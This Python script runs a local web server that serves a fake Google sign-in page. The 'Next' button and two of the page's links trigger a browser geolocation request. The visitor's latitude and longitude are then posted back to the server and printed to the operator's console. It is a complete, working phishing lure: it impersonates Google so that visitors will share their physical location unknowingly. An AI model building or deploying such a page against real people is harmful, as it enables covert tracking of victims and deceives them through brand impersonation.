from http.server import HTTPServer, SimpleHTTPRequestHandler
import json

class LocationHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = """
            <!DOCTYPE html>
            <html>
            
            <title>Google Sign-In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f8f9fa;
        }
        .container {
            width: 350px;
            background: white;
            padding: 30px;
            text-align: center;
            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            font-family: 'Product Sans', Arial, sans-serif;
        }
        .logo span {
            display: inline-block;
        }
        .g { color: #4285F4; }
        .o1 { color: #EA4335; }
        .o2 { color: #FBBC05; }
        .g2 { color: #4285F4; }
        .l { color: #34A853; }
        .e { color: #EA4335; }
        .input-box {
            width: 100%;
            padding: 10px;
            margin-top: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .forgot-link, .create-link {
            display: block;
            margin-top: 10px;
            color: #4285F4;
            text-decoration: none;
            font-size: 14px;
        }
        .button {
            width: 100%;
            padding: 10px;
            margin-top: 20px;
            background-color: #4285F4;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: gray;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
        </div>
        <h2>Sign in</h2>
        <p>Use your Google Account</p>
        <input type="text" class="input-box" placeholder="Email or phone">
        <a href="#" onclick="getLocation()"class="forgot-link">Forgot email?</a>
        <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
        <a href="#" onclick="getLocation()" class="create-link">Create account</a>
        <button onclick="getLocation()" class="button">Next</button>
        <div class="footer">
            English (United States) &nbsp; <a href="#">Help</a> &nbsp; <a href="#">Privacy</a> &nbsp; <a href="#">Terms</a>
        </div>
    </div>
                
                <script>
                function getLocation() {
                    
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            function(position) {
                                fetch('/location', {
                                    method: 'POST',
                                    body: JSON.stringify({
                                        lat: position.coords.latitude,
                                        lon: position.coords.longitude
                                    })
                                });
                                
                            },
                           
                        );
                    } else {  
                    }
                }
                </script>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
            
    def do_POST(self):
        if self.path == '/location':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            location_data = json.loads(post_data.decode())
            print(f"\nReceived location:")
            print(f"Latitude: {location_data['lat']}")
            print(f"Longitude: {location_data['lon']}")
            self.send_response(200)
            self.end_headers()

server = HTTPServer(('localhost', 8000), LocationHandler)
print("Server started at http://localhost:8000")
print("Press Ctrl+C to stop")
server.serve_forever()